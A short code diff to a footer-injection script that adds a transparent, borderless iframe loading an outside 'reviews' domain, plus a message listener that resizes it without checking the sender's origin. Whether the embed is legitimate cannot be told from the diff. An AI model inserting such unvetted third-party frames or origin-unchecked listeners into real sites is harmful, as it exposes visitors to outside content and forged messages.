@@ -3,6 +3,13 @@ document.addEventListener('DOMContentLoaded', () => {
     if (document.getElementById('unknown-footer-links')) return;
     
     const html = `
+          <iframe 
+            id="reviewsFrame"
+            src="https://nel.allfashiongloves.tech/reviews/"
+            style="border:none; outline:none; width:100%; background:transparent;" 
+            scrolling="no" 
+            loading="lazy">
+        </iframe>
         <div id="unknown-footer-links-wrapper" class="unknown-footer-links-wrapper">
             <div id="unknown-footer-links" class="unknown-footer-links" aria-label="Footer links">
                 <div class="unknown-column">
@@ -91,4 +98,15 @@ document.addEventListener('DOMContentLoaded', () => {
     `;
     
     target.insertAdjacentHTML('beforeend', html);
+
+    
+    // Listen for messages from iframe
+    window.addEventListener("message", function(event) {
+      if (event.data.iframeHeight) {
+        var iframe = document.getElementById("reviewsFrame");
+        if (iframe) {
+          iframe.style.height = event.data.iframeHeight + "px";
+        }
+      }
+    });
 });
